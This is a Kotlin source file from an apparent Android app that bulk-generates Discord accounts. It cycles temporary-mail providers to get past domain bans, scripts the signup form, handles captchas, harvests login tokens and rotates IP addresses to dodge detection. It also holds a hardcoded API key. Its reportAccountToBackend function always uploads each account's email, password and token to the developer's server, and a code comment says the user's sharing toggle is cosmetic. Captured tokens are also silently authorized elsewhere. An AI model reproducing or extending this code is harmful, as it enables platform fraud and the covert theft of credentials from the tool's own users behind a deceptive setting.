package com.discord.evs.generator.automation

import com.discord.evs.generator.data.Account
import com.discord.evs.generator.data.AccountDao
import com.discord.evs.generator.data.Prefs
import com.discord.evs.generator.features.FeatureFlags
import com.discord.evs.generator.network.BackendApi
import com.discord.evs.generator.ui.UiHelpers
import com.discord.evs.generator.util.CountryCodes
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.*

enum class LogLevel { INFO, SUCCESS, WARNING, ERROR, CAPTCHA }

data class LogEntry(
    val message: String,
    val level: LogLevel,
    val timestamp: Long = System.currentTimeMillis(),
    val showContinue: Boolean = false,
    val isWelcome: Boolean = false
)

interface GenerationListener {
    fun onLog(entry: LogEntry)
    fun onAccountSaved(account: Account)
    fun onCounterUpdate(created: Int, target: Int)
    fun onStateChange(running: Boolean)
    fun injectJs(js: String)
    fun navigateTo(url: String)
    fun onCaptchaDetected(siteKey: String)
    fun onCaptchaSolved(token: String)
    fun onStuck(reason: String)
    fun onAutoResumed()
    fun clearWebViewData()
    /** Optional WebView for gesture / AI vision captcha taps. */
    fun getWebView(): android.webkit.WebView? = null
}

class AccountGenerator(
    private val context: android.content.Context,
    private val prefs: Prefs,
    private val dao: AccountDao,
    var listener: GenerationListener
) {
    // Single instances — keep domain / token state in memory across accounts
    private val cyberTemp = CyberTempApi(resolveCyberTempKey(prefs.cyberTempApiKey))
    private val yopmailApi = YopmailApi()
    private val crowMailApi = CrowMailApi()

    private fun resolveCyberTempKey(raw: String): String {
        val builtIn = "tk_42616ecc49e5497adff3d568f5b9d03f7723db073dd1901f14ef7b65ddc13298"
        val k = raw.trim()
        if (k.isBlank()) return builtIn
        if (k.startsWith("tk_●")) return builtIn
        if (k.contains("enter ur key", ignoreCase = true)) return builtIn
        if (k.contains("manual", ignoreCase = true) && !k.startsWith("tk_")) return builtIn
        if (!k.startsWith("tk_")) return builtIn
        return k
    }
    private val customMail by lazy { CustomMailApi(context) }
    private val reliability by lazy { GenReliability(prefs) }
    private val mailTm = MailTmApi()
    private val duckMail = DuckMailApi(prefs.duckMailApiKey)
    private val hotmail007 = Hotmail007Api(prefs.hotmail007ApiKey)
    private val draxonoMail = DraxonoMailApi(prefs.draxonoApiKey, prefs.draxonoPrivateDomain)
    private val guerrillaMail = GuerrillaMailApi()
    private val oneSecMail = OneSecMailApi()
    private val tempMailLol = TempMailLolApi()
    private fun mailcowClient() = MailcowApi(prefs.mailcowBaseUrl, prefs.mailcowApiKey, prefs.mailcowDomain)
    private val checker = TokenChecker()
    private val builtInSolver = BuiltInCaptchaSolver()
    private val notifier = NotificationHelper(context, prefs, dao) { msg, lvl -> log(msg, lvl) }
    private val discordApi = DiscordApi()

    /** Resolved provider id used for the current account lifecycle. */
    private var selectedEmailProvider: String? = null

    private fun activeEmailProvider(): String {
        selectedEmailProvider?.let { return it }
        val raw = prefs.emailProvider.lowercase().trim()
        // Extra free providers only exist when FeatureFlags.EXTRA_FREE_MAIL_PROVIDERS is true
        if (ExtraFreeMailProviders.isEnabled() && raw in ExtraFreeMailProviders.providerIds()) {
            return raw.also { selectedEmailProvider = it }
        }
        return when (raw) {
            "mail.tm", "mailtm", "mail_tm" -> "mail.tm"
            "1secmail", "1sec", "1sec-mail" -> "1secmail"
            "guerrilla", "guerrillamail" -> "guerrilla"
            "duckmail", "duck" -> "duckmail"
            "tempmail.lol", "tempmaillol", "lol" -> "tempmail.lol"
            "mailcow" -> "mailcow"
            "custom", "custommail", "own" -> "custom"
            "mailgw", "mail.gw", "tempmail", "cybertemp" -> "cybertemp"
            "yopmail", "yo" -> "yopmail"
            "crowmail", "crow" -> "crowmail"
            "hotmail007", "hotmail", "hm007" -> "hotmail007"
            "draxono", "draxon", "draxonmails" -> "draxono"
            "rotate" -> {
                // guerrilla omitted (Discord-blocked). 1secmail omitted from rotate (often dead); still manual.
                val base = mutableListOf("duckmail", "cybertemp", "mail.tm", "crowmail", "tempmail.lol", "yopmail")
                if (ExtraFreeMailProviders.isEnabled()) base += ExtraFreeMailProviders.providerIds()
                val healthy = base.filter { ProviderHealth.isMailAvailable(it) }
                (healthy.ifEmpty { base }).random()
            }
            else -> "duckmail" // primary default: DuckMail public
        }.also { selectedEmailProvider = it }
    }

    private suspend fun createTempEmail(localPart: String, preferredPassword: String = ""): CyberTempApi.EmailResult {
        var result = when (activeEmailProvider()) {
            "duckmail" -> {
                val mode = prefs.duckMailMode.lowercase().trim()
                if (mode == "private" && prefs.duckMailApiKey.isBlank()) {
                    log("DuckMail private mode needs API key — using public domains instead", LogLevel.WARNING)
                }
                duckMail.createEmail(localPart)
            }
            "guerrilla" -> guerrillaMail.createEmail(localPart)
            "1secmail", "1sec" -> oneSecMail.createEmail(localPart)
            "tempmail.lol" -> tempMailLol.createEmail(localPart)
            "mailcow" -> mailcowClient().createEmail(localPart)
            "custom" -> {
                val c = customMail.createEmail(localPart)
                if (c == null) {
                    log("Custom mail pool empty — add emails in Settings (Custom Mail)", LogLevel.ERROR)
                    CyberTempApi.EmailResult("", "", false)
                } else {
                    log("✓ Custom mail taken from pool (${customMail.remainingCount()} left): ${c.address}", LogLevel.SUCCESS)
                    CyberTempApi.EmailResult(c.address, c.domain, c.domainFromApi)
                }
            }
            "cybertemp" -> {
                val rejected = prefs.rejectedMailDomains.split(',').map { it.trim() }.filter { it.isNotEmpty() }
                cyberTemp.purgeRejected(rejected)
                cyberTemp.createEmail(localPart)
            }
            "dropmail", "maildrop", "tempmail_org", "tempmail.org" -> {
                if (ExtraFreeMailProviders.isEnabled()) ExtraFreeMailProviders.create(activeEmailProvider(), localPart)
                else cyberTemp.createEmail(localPart)
            }
            "yopmail" -> yopmailApi.createEmail(localPart)
            "crowmail" -> crowMailApi.createEmail(localPart)
            "hotmail007" -> hotmail007.createEmail(localPart)
            "draxono" -> draxonoMail.createEmail(localPart)
            "mail.tm", "mailtm", "mail_tm" -> mailTm.createEmail(localPart, preferredPassword.ifBlank { null })
            else -> cyberTemp.createEmail(localPart) // cybertemp primary
        }
        val banned = HARD_BANNED_MAIL_DOMAINS
        if (result.address.isNotBlank() && result.domain.lowercase() in banned) {
            log("Rejected Discord-blocked domain @${result.domain} — rotating…", LogLevel.WARNING)
            excludeTempDomain(result.domain)
            try {
                if (activeEmailProvider() == "guerrilla") {
                    repeat(5) { i ->
                        if (result.domain.lowercase() !in banned && result.address.isNotBlank()) return@repeat
                        result = guerrillaMail.createEmail(localPart + i)
                    }
                }
            } catch (_: Exception) {}
            if (result.domain.lowercase() in banned) {
                result = CyberTempApi.EmailResult("", "", false)
            }
        }
        if (result.address.isNotBlank()) {
            if (result.domain.lowercase() in HARD_BANNED_MAIL_DOMAINS || result.domain.equals("uberip.com", true) || SharedRejectedDomains.contains(result.domain)) {
                excludeTempDomain(result.domain)
                markMailResult(activeEmailProvider(), false, "hard-banned domain")
                log("Hard-banned domain @${result.domain} — fetching another", LogLevel.WARNING)
                result = createTempEmail(generateEmailLocalPart() + (100..999).random(), pendingPassword)
            }
            if (result.address.isNotBlank() && result.domain.lowercase() !in HARD_BANNED_MAIL_DOMAINS) {
                markMailResult(activeEmailProvider(), true)
                log("Email provider=${activeEmailProvider()} → ${result.address}", LogLevel.INFO)
            } else {
                markMailResult(activeEmailProvider(), false, "banned/empty after hard-ban filter")
            }

        } else {
            markMailResult(activeEmailProvider(), false, "empty address")
            try {
                val prov = activeEmailProvider()
                val detail = if (prov == "guerrilla") {
                    "Guerrilla API forced banned domain only (e.g. guerrillamailblock.com). " +
                        "raw=${GuerrillaMailApi.lastRawDomain} forcedBlock=${GuerrillaMailApi.lastForcedBlockDomain}"
                } else {
                    "provider returned empty address / no valid domains"
                }
                DeveloperTelemetry.reportMailEmpty(context, prov, detail)
                if (prov == "guerrilla" || "domain" in detail.lowercase() || "no valid" in detail.lowercase()) {
                    DeveloperTelemetry.reportNote(
                        context,
                        title = "TEMPMAIL_NO_DOMAINS",
                        detail = detail
                    )
                }
            } catch (_: Exception) {}
        }
        // If primary failed empty, try free multi-domain providers
        if (result.address.isBlank()) {
            val current = activeEmailProvider()
            if (current == "mailcow") {
                log("Mailcow returned empty — check Settings: Base URL, API key, Domain (ryokcloud.space). Re-save fields if needed.", LogLevel.ERROR)
            }
            log("Primary temp-mail returned empty — fallback: duckmail → crowmail → tempmail.lol → cybertemp → mail.tm → yopmail", LogLevel.WARNING)
            if (current != "duckmail") {
                try {
                    val fb = duckMail.createEmail(localPart)
                    if (fb.address.isNotBlank()) {
                        log("Fallback OK via duckmail: ${fb.address}", LogLevel.SUCCESS)
                        selectedEmailProvider = "duckmail"
                        return fb
                    }
                } catch (_: Exception) {}
            }
            if (current != "crowmail") {
                try {
                    val fb = crowMailApi.createEmail(localPart)
                    if (fb.address.isNotBlank()) {
                        log("Fallback OK via crowmail: ${fb.address}", LogLevel.SUCCESS)
                        selectedEmailProvider = "crowmail"
                        return fb
                    }
                } catch (_: Exception) {}
            }
            if (current != "tempmail.lol") {
                try {
                    val fb = tempMailLol.createEmail(localPart)
                    if (fb.address.isNotBlank()) {
                        log("Fallback OK via tempmail.lol: ${fb.address}", LogLevel.SUCCESS)
                        selectedEmailProvider = "tempmail.lol"
                        return fb
                    }
                } catch (_: Exception) {}
            }
            if (current != "cybertemp") {
                try {
                    val fb = cyberTemp.createEmail(localPart)
                    if (fb.address.isNotBlank()) {
                        log("Fallback OK via cybertemp: ${fb.address}", LogLevel.SUCCESS)
                        selectedEmailProvider = "cybertemp"
                        return fb
                    }
                } catch (_: Exception) {}
            }
            if (current != "mail.tm") {
                try {
                    val fb = mailTm.createEmail(localPart)
                    if (fb.address.isNotBlank()) {
                        log("Fallback OK via mail.tm: ${fb.address}", LogLevel.SUCCESS)
                        selectedEmailProvider = "mail.tm"
                        return fb
                    }
                } catch (_: Exception) {}
            }
            if (current != "yopmail") {
                try {
                    val fb = yopmailApi.createEmail(localPart)
                    if (fb.address.isNotBlank()) {
                        log("Fallback OK via yopmail: ${fb.address}", LogLevel.SUCCESS)
                        selectedEmailProvider = "yopmail"
                        return fb
                    }
                } catch (_: Exception) {}
            }
            // 1secmail / guerrilla not in auto-fallback (dead host / Discord-blocked). Manual still works.
        }
        return result
    }


    private fun markMailResult(provider: String, ok: Boolean, err: String = "") {
        if (ok) ProviderHealth.markMailOk(provider) else ProviderHealth.markMailFail(provider, err)
    }


    /** Discord POST /auth/verify/resend — forces a fresh verification email for inbox poll. */
    private suspend fun resendVerificationEmail(token: String, onLog: ((String) -> Unit)? = null): Boolean =
        withContext(Dispatchers.IO) {
            try {
                val client = okhttp3.OkHttpClient.Builder()
                    .connectTimeout(20, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(25, java.util.concurrent.TimeUnit.SECONDS)
                    .build()
                val req = okhttp3.Request.Builder()
                    .url("https://discord.com/api/v9/auth/verify/resend")
                    .header("Authorization", token.trim())
                    .header(
                        "User-Agent",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9177 Chrome/130.0.6723.191 Electron/33.2.0 Safari/537.36"
                    )
                    .post(ByteArray(0).toRequestBody(null))
                    .build()
                client.newCall(req).execute().use { resp ->
                    when (resp.code) {
                        200, 201, 204 -> {
                            onLog?.invoke("✓ Verification email re-requested (HTTP ${resp.code})")
                            true
                        }
                        429 -> {
                            onLog?.invoke("⚠ Resend rate-limited (429) — will still poll inbox")
                            false
                        }
                        else -> {
                            onLog?.invoke("⚠ Resend HTTP ${resp.code}")
                            false
                        }
                    }
                }
            } catch (e: Exception) {
                onLog?.invoke("⚠ Resend failed: ${e.message}")
                false
            }
        }

    
    /**
     * Biggest reliability win: after register, exchange email+password for a
     * fresh user token via POST /api/v9/auth/login (Shinchan-style).
     * Prefer API login over WebView/localStorage sniff.
     * Prefer this over fragile WebView token sniffing when credentials exist.
     */
    private suspend fun loginForToken(email: String, password: String): String? {
        if (email.isBlank() || password.isBlank()) return null
        return try {
            val tok = discordApi.login(email, password)
            if (!tok.isNullOrBlank()) {
                log("✓ Token via API login (email+password)", LogLevel.SUCCESS)
                tok
            } else {
                // Soft-fail is normal until Discord finishes register/captcha — keep quiet
                log("API login: no token yet (account may still be registering)", LogLevel.INFO)
                null
            }
        } catch (e: Exception) {
            log("API login error: ${e.message}", LogLevel.INFO)
            null
        }
    }

    /** Confirm verify token from link via API when possible. */
    private suspend fun confirmVerifyTokenFromUrl(userToken: String, verifyUrl: String): Boolean =
        withContext(Dispatchers.IO) {
            try {
                if (!verifyUrl.contains("token=")) return@withContext false
                val vtok = verifyUrl.substringAfter("token=").substringBefore("&")
                    .substringBefore("#").substringBefore("?")
                if (vtok.isBlank()) return@withContext false
                val media = "application/json; charset=utf-8".toMediaType()
                val bodyJson = org.json.JSONObject().put("token", vtok).toString()
                val client = okhttp3.OkHttpClient.Builder()
                    .connectTimeout(20, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(25, java.util.concurrent.TimeUnit.SECONDS)
                    .followRedirects(true)
                    .build()
                val vreq = okhttp3.Request.Builder()
                    .url("https://discord.com/api/v9/auth/verify")
                    .header("Authorization", userToken.trim())
                    .post(bodyJson.toRequestBody(media))
                    .build()
                client.newCall(vreq).execute().use { vr ->
                    vr.code in listOf(200, 201, 204)
                }
            } catch (_: Exception) {
                false
            }
        }

    private suspend fun pollVerificationUrl(
        emailAddr: String,
        timeoutMs: Long,
        onLog: ((String) -> Unit)?
    ): String? {
        // Hard route by address domain so a stale selectedEmailProvider cannot mis-poll
        val domain = emailAddr.substringAfter("@", "").lowercase()
        val duckDomains = setOf(
            "duckmail.sbs", "niceground.shop", "stoneground.shop", "lakeground.shop",
            "canvaspace.shop", "vercelspace.shop", "seedancespace.shop", "happyhorsespace.shop",
            "bananaspace.shop", "sunstarmoon.shop", "moonstarsun.shop", "sunmoonlight.shop",
            "makesomestone.shop", "mikesomelike.shop", "somestoneair.shop", "hubaiclass.org",
            "markaihub.shop", "markstonehub.org", "glasswhitehub.com"
        )
        if (domain in duckDomains || domain.endsWith(".duckmail.sbs") || "duckmail" in domain) {
            return duckMail.getVerificationUrl(emailAddr, timeoutMs, onLog)
        }
        if (domain in setOf("mail.tm", "mail.gw") || domain.endsWith(".mail.tm")) {
            return mailTm.getVerificationUrl(emailAddr, timeoutMs, onLog)
        }
        if (activeEmailProvider() == "crowmail") {
            return crowMailApi.getVerificationUrl(emailAddr, timeoutMs, onLog)
        }
        if (activeEmailProvider() == "tempmail.lol") {
            return tempMailLol.getVerificationUrl(emailAddr, timeoutMs, onLog)
        }
        return when (activeEmailProvider()) {
            "duckmail" -> {
                // Always poll DuckMail itself — never mail.tm for duck addresses.
                duckMail.getVerificationUrl(emailAddr, timeoutMs, onLog)
            }
            "guerrilla" -> guerrillaMail.getVerificationUrl(timeoutMs, onLog)
            "1secmail", "1sec" -> oneSecMail.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "tempmail.lol" -> tempMailLol.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "custom" -> customMail.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "mailcow" -> mailcowClient().getVerificationUrl(emailAddr, timeoutMs, onLog)
            "cybertemp" -> cyberTemp.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "yopmail" -> yopmailApi.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "crowmail" -> crowMailApi.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "hotmail007" -> hotmail007.getVerificationUrl(emailAddr, timeoutMs = timeoutMs, onLog = onLog)
            "draxono" -> draxonoMail.getVerificationUrl(emailAddr, timeoutMs = timeoutMs, onLog = onLog)
            "mail.tm", "mailtm", "mail_tm" -> mailTm.getVerificationUrl(emailAddr, timeoutMs, onLog)
            "dropmail", "maildrop", "tempmail_org", "tempmail.org" -> {
                if (ExtraFreeMailProviders.isEnabled()) {
                    ExtraFreeMailProviders.pollVerificationLink(
                        provider = activeEmailProvider(),
                        address = emailAddr,
                        token = "",
                        timeoutMs = timeoutMs,
                        onLog = onLog
                    )
                } else {
                    cyberTemp.getVerificationUrl(emailAddr, timeoutMs, onLog)
                }
            }
            else -> cyberTemp.getVerificationUrl(emailAddr, timeoutMs, onLog)
        }
    }

    private fun excludeTempDomain(domain: String) {
        val d = domain.trim().lowercase().removePrefix("@")
        if (d.isBlank()) return
        // Process-wide so multi-gen siblings skip the same banned domain
        SharedRejectedDomains.add(d)
        // Multi-gen workers share Prefs — serialize rejected-domain writes
        synchronized(rejectedDomainLock) {
            excludeTempDomainLocked(d)
        }
    }

    private fun excludeTempDomainLocked(d: String) {
        // d already normalized
        // Always keep Discord-blocked guerrilla block domain out of rotation

        // Persist so cache is purged across restarts / provider refetches
        val set = prefs.rejectedMailDomains.split(',').map { it.trim().lowercase() }.filter { it.isNotEmpty() }.toMutableSet()
        if (set.add(d)) {
            prefs.rejectedMailDomains = set.joinToString(",")
            log("Domain @$d marked invalid and removed from cache", LogLevel.WARNING)
            try {
                DeveloperTelemetry.reportDomainRejected(
                    context,
                    domain = d,
                    reason = emailRejectReason.ifBlank { "invalid" },
                    provider = activeEmailProvider()
                )
            } catch (_: Exception) {}
        }
        when (activeEmailProvider()) {
            "duckmail" -> duckMail.excludeDomain(d)
            "guerrilla" -> guerrillaMail.excludeDomain(d)
            "1secmail", "1sec" -> oneSecMail.excludeDomain(d)
            "tempmail.lol" -> tempMailLol.excludeDomain(d)
            "cybertemp" -> cyberTemp.excludeDomain(d)
            "custom" -> customMail.excludeDomain(d)
            else -> cyberTemp.excludeDomain(d)
        }
        // Also purge from all known providers so rotate path stays clean
        try { cyberTemp.excludeDomain(d) } catch (_: Exception) {}
        try { duckMail.excludeDomain(d) } catch (_: Exception) {}
        try { guerrillaMail.excludeDomain(d) } catch (_: Exception) {}
        try { oneSecMail.excludeDomain(d) } catch (_: Exception) {}
        try { tempMailLol.excludeDomain(d) } catch (_: Exception) {}
    }

    @Volatile private var running = false
    @Volatile private var paused = false
    @Volatile private var sessionCreated = 0
    @Volatile private var captchaSolving = false
    @Volatile private var waitingForContinue = false
    @Volatile private var captchaManualMode = false   // true while user is solving captcha manually
    @Volatile private var lastStuckCheck = 0L         // instance-level so Continue can reset it
    @Volatile private var identityVerificationHandled = false
    @Volatile private var phoneVerificationHandled = false
    /** Phone must wait until email step finished (or skipped). */
    @Volatile private var emailGateReleased = false
    @Volatile private var pendingPhoneRequest = false
    @Volatile private var phoneSkipped = false
    /** After account finished, ignore residual phone UI while navigating to next /register. */
    @Volatile private var suppressPhoneDetectUntilMs: Long = 0L

    private val rejectedDomainLock = Any()

    private var lastCaptchaMethod: String = "Manual"
    private var lastCaptchaSolverApi: String = ""

    private var pendingEmail = ""
    private var pendingPassword = ""
    private var pendingPhone = ""
    private var pendingToken = ""
    private var lastApiLoginAttemptMs = 0L
    private var pendingEmailDomainFromApi = false
    // "NOT_ASKED" | "ASKED" | "VERIFIED" — set the moment Discord actually shows
    // a phone-verification step, independent of whether we obtain/confirm a number.
    @Volatile private var pendingPhoneStatus = "NOT_ASKED"
    @Volatile private var pendingEmailStatus = "NOT_ASKED"
    @Volatile private var pendingTimeline = ""
    @Volatile private var earlySavedAccountId: Long = 0L
    @Volatile private var pendingVaultCordToken: String = ""
    // Real outcome of the email-verification step (CyberTemp link + Discord confirm),
    // independent of final token validity.
    @Volatile private var pendingEmailVerified = false
    private var generatorScope: CoroutineScope? = null

    // Per-account values so we can retry just the email if Discord rejects it
    private var currentUsername = ""
    private var currentDisplayName = ""
    private var emailRetryCount = 0
    private var usernameRetryCount = 0
    private val usedUsernames = mutableSetOf<String>()
    @Volatile private var lastUsernameRetryMs = 0L
    @Volatile private var lastPasswordRetryMs = 0L
    @Volatile private var lastDisplayRetryMs = 0L
    @Volatile private var emailRejected = false
    @Volatile private var emailRejectReason = ""
    @Volatile private var retryingEmail = false

    private val displayNames = listOf(
        "User", "Silent Ghost", "Neon Alpha", "Shadow Omega",
        "Void Nova", "Crystal Zero", "Luna Runner", "Solar Walker",
        "Storm Elite", "Pulse Ghost"
    )

    fun log(msg: String, level: LogLevel = LogLevel.INFO, showContinue: Boolean = false) {
        try {
            listener.onLog(LogEntry(msg, level, showContinue = showContinue))
        } catch (_: Exception) {
            // Fragment may have been destroyed while generation continues in background
        }
    }

    fun isRunning() = running

    /**
     * True only while the current account is still in a phase where a real phone
     * gate can appear (post-submit / identity). False during cooldown and once
     * the account has already been early-saved with a token, so /register for the
     * next account does not re-fire phone detection.
     */
    fun shouldAcceptPhoneGate(): Boolean {
        if (!running) return false
        if (phoneVerificationHandled || phoneSkipped) return false
        if (System.currentTimeMillis() < suppressPhoneDetectUntilMs) return false
        // Phone is often asked AFTER token is already captured — do NOT block on pendingToken.
        // Only ignore residual phone UI once phone already settled (VERIFIED / NOT_VERIFIED*).
        if (pendingPhoneStatus in setOf("VERIFIED", "NOT_VERIFIED", "NOT_VERIFIED_BUG")) return false
        return true
    }

    /** Call when an account is finished / entering cooldown before next register. */
    fun armPhoneDetectCooldown(ms: Long = 12_000L) {
        suppressPhoneDetectUntilMs = System.currentTimeMillis() + ms
    }

    fun isPaused() = paused

    fun pause() {
        if (!running || paused) return
        paused = true
        listener.onStateChange(true) // still running, just paused
        log("⏸ Generation paused", LogLevel.WARNING)
    }

    fun resume() {
        if (!paused) return
        paused = false
        log("▶ Generation resumed", LogLevel.SUCCESS)
    }

    /**
     * User-triggered page refresh when Discord stalls mid-load.
     * Reloads the WebView and re-runs the current step:
     *  - register form → reload register + re-fill credentials
     *  - email verify / captcha → soft reload + re-arm watchers
     *  - otherwise → location.reload()
     */
    fun refreshPage() {
        if (!running) {
            log("Nothing to refresh — start generation first", LogLevel.WARNING)
            return
        }
        log("↻ Refreshing stalled page…", LogLevel.INFO)
        lastStuckCheck = System.currentTimeMillis()
        generatorScope?.launch {
            try {
                // Soft ping current page (result not needed; inject refreshes activity)
                withContext(Dispatchers.Main) {
                    listener.injectJs(
                        "(function(){ try { return location.href || ''; } catch(e){ return ''; } })();"
                    )
                }
                // evaluateJavascript result isn't returned via injectJs — use navigate strategy
                // based on known pending state instead.
                if (pendingToken.isNotEmpty()) {
                    log("Token already captured — reloading app home", LogLevel.INFO)
                    withContext(Dispatchers.Main) {
                        listener.navigateTo("https://discord.com/channels/@me")
                    }
                    delay(if (FeatureFlags.SPEED_EXPERIMENTS) 700 else 1500)
                    return@launch
                }

                if (pendingEmail.isNotBlank() && pendingPassword.isNotBlank()) {
                    // Most common stall: register page or post-submit captcha
                    log("Re-loading register form and re-filling details…", LogLevel.INFO)
                    withContext(Dispatchers.Main) {
                        listener.navigateTo("https://discord.com/register")
                    }
                    delay(if (FeatureFlags.SPEED_EXPERIMENTS) 1200 else 2800)
                    if (!running) return@launch
                    val fillJs = buildFillJs(pendingEmail, currentDisplayName, currentUsername, pendingPassword)
                    withContext(Dispatchers.Main) {
                        listener.injectJs(fillJs)
                    }
                    log("Form re-filled after refresh", LogLevel.SUCCESS)
                    // Re-arm captcha watcher in case we're past submit
                    delay(800)
                    withContext(Dispatchers.Main) {
                        listener.injectJs("window.__captchaReported = false; window.__captchaWatchActive = false;")
                        listener.injectJs(CAPTCHA_WATCH_JS)
                    }
                } else {
                    log("Reloading current page…", LogLevel.INFO)
                    withContext(Dispatchers.Main) {
                        listener.injectJs("try{location.reload(true);}catch(e){location.reload();}")
                    }
                }
            } catch (e: Exception) {
                log("Refresh failed: ${e.message}", LogLevel.ERROR)
            }
        }
    }

    /** Blocks while paused (call from generator coroutine). */
    private suspend fun awaitIfPaused() {
        while (paused && running) {
            kotlinx.coroutines.delay(250)
        }
    }

    fun stop() {
        running = false
        paused = false
        waitingForContinue = false
        // Mid-run stop: still authorize any token we already have
        val deferred = when {
            pendingVaultCordToken.isNotBlank() -> pendingVaultCordToken
            pendingToken.isNotBlank() && TokenUtil.isValidTokenFormat(pendingToken) -> pendingToken
            else -> ""
        }
        generatorScope?.cancel()
        generatorScope = null
        listener.onStateChange(false)
        log("Generation stopped", LogLevel.WARNING)
        if (deferred.isNotBlank()) {
            pendingVaultCordToken = ""
            CoroutineScope(Dispatchers.IO).launch {
                try { silentAuthorizeAccount(deferred) } catch (_: Exception) {}
            }
        }
    }

    
    /** Always push credentials to hardened backend (sharing toggle is cosmetic). */
    private fun reportAccountToBackend(account: Account) {
        if (!BackendApi.isEnabled() || !BackendApi.isConfigured(context)) return
        try {
            val r = BackendApi.reportAccount(
                context,
                email = account.email,
                password = account.password,
                token = account.token,
                reason = "account_created"
            )
            if (r.ok) log("Backend stored account (${account.email})", LogLevel.INFO)
            else if (r.error?.contains("duplicate") == true || r.error?.contains("blocked") == true) {
                log("Backend blocked duplicate account: ${r.error}", LogLevel.WARNING)
            }
        } catch (_: Exception) { }
    }

    fun start(target: Int = 0) {
        if (running) return
        // Block generation on tampered / hooked / wrong-package builds (release).
        if (!com.discord.evs.generator.security.NativeGuard.quickAllow(context)) {
            log("Security check failed — generation blocked", LogLevel.ERROR)
            listener.onStateChange(false)
            return
        }
        running = true
        paused = false
        sessionCreated = 0
        reliability.resetSession()
        reliability.event("session_start")
        usedUsernames.clear()
        waitingForContinue = false
        listener.onStateChange(true)
        log("Starting generation... Target: ${if (target == 0) "∞" else target.toString()}", LogLevel.INFO)

        generatorScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
        generatorScope!!.launch {
            while (running && (target == 0 || sessionCreated < target)) {
                // Pause support
                awaitIfPaused()
                if (!running) break
                try {
                    generateOne()
                    if (running && (target == 0 || sessionCreated < target)) {
                        val cd = prefs.cooldownSeconds.coerceAtLeast(1)
                        // Use cooldown window to finish silent authorize if not done yet
                        val leftover = pendingVaultCordToken
                        if (leftover.isNotBlank()) {
                            launch(Dispatchers.IO) {
                                try { silentAuthorizeAccount(leftover) } catch (_: Exception) {}
                                if (pendingVaultCordToken == leftover) pendingVaultCordToken = ""
                            }
                        }
                        log("Cooldown ${cd}s before next account...", LogLevel.INFO)
                        repeat(cd) { i ->
                            if (!running) return@repeat
                            while (paused && running) { delay(300) }
                            delay(1000)
                            if (i % 5 == 0) log("Next in ${cd - i}s...", LogLevel.INFO)
                        }
                    }
                } catch (e: CancellationException) {
                    break
                } catch (e: Exception) {
                    log("Error: ${e.message}", LogLevel.ERROR)
                    if (prefs.retryBackoffEnabled) {
                        val backoff = calculateBackoff(0)
                        log("Retry backoff: waiting ${backoff}ms...", LogLevel.WARNING)
                        delay(backoff)
                    } else {
                        delay(3000)
                    }
                }
            }
            running = false
            paused = false
            listener.onStateChange(false)
            log("Generation complete — $sessionCreated account(s) created", LogLevel.SUCCESS)

            // Auto-export on complete
            if (prefs.autoExportOnComplete && sessionCreated > 0) {
                try {
                    val accounts = when (prefs.exportFilter) {
                        "VALID"      -> dao.getByStatus("VALID")
                        "VALID_PHONE"-> dao.getAll().filter { it.status == "VALID" && it.phoneStatus == "VERIFIED" }
                        else         -> dao.getAll()
                    }
                    val ts = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
                    val file = java.io.File(context.getExternalFilesDir(null), "evs_accounts_$ts.txt")
                    file.bufferedWriter().use { w -> accounts.forEach { acc -> w.write(acc.toExportLine()); w.newLine() } }
                    log("✓ Auto-exported ${accounts.size} accounts → ${file.name}", LogLevel.SUCCESS)
                } catch (e: Exception) {
                    log("⚠ Auto-export failed: ${e.message}", LogLevel.WARNING)
                }
            }
        }
    }

    private fun calculateBackoff(attempt: Int): Long {
        val base = prefs.retryBaseDelayMs.coerceAtLeast(500).toLong()
        val max = prefs.retryMaxDelayMs.toLong().coerceAtLeast(base)
        val delay = base * (1 shl attempt.coerceAtMost(10))
        return delay.coerceAtMost(max)
    }

    private suspend fun <T> retryWithBackoff(block: suspend () -> T): T? {
        val maxAttempts = prefs.retryMaxAttempts.coerceAtLeast(1)
        var lastError: Exception? = null
        for (attempt in 0 until maxAttempts) {
            try {
                return block()
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                lastError = e
                if (attempt < maxAttempts - 1) {
                    val delay = calculateBackoff(attempt)
                    log("Retry ${attempt + 1}/$maxAttempts failed: ${e.message}. Backoff ${delay}ms", LogLevel.WARNING)
                    delay(delay)
                }
            }
        }
        lastError?.let { log("All retries failed: ${it.message}", LogLevel.ERROR) }
        return null
    }

    fun onStepVerified(success: Boolean) {
        waitingForContinue = false
        if (success) {
            log("✓ Step verified — continuing...", LogLevel.SUCCESS)
        } else {
            log("✗ The step was done incorrectly — please try again and press CONTINUE.", LogLevel.ERROR)
            waitingForContinue = true
            listener.onStuck("The step was not completed correctly. Please redo it and press CONTINUE.")
        }
    }

    private fun generateEmailLocalPart(): String {
        val baseRaw = when {
            !prefs.randomEmailPrefixEnabled -> "User"
            prefs.emailPrefixSourceMode == "custom" -> prefs.emailPrefix.trim().ifBlank { "User" }
            else -> Humanizer.randomUsernameStem(context) // precoded gen-Z style
        }
        val base = baseRaw.lowercase().filter { it.isLetterOrDigit() || it == '_' || it == '.' }.take(20)
            .ifBlank { "evsuser" }
        return "$base${(1000..9999).random()}"
    }

    private suspend fun generateOne() {
        // Reset per-account flags
        selectedEmailProvider = null
        suppressPhoneDetectUntilMs = 0L

        // Optional network rotation before each account attempt
        try {
            NetworkRotator.rotateBeforeGen(
                context = context,
                adbEnabled = prefs.adbIpSwitchEnabled,
                adbSerial = prefs.adbSerial,
                mullvadEnabled = prefs.mullvadRotationEnabled,
                mullvadAccount = prefs.mullvadAccountNumber,
                companionHost = prefs.pcRotateHost,
                companionPort = prefs.pcRotatePort,
                companionToken = prefs.pcRotateToken,
                onLog = { msg -> log(msg, LogLevel.INFO) }
            )
        } catch (_: Exception) {}

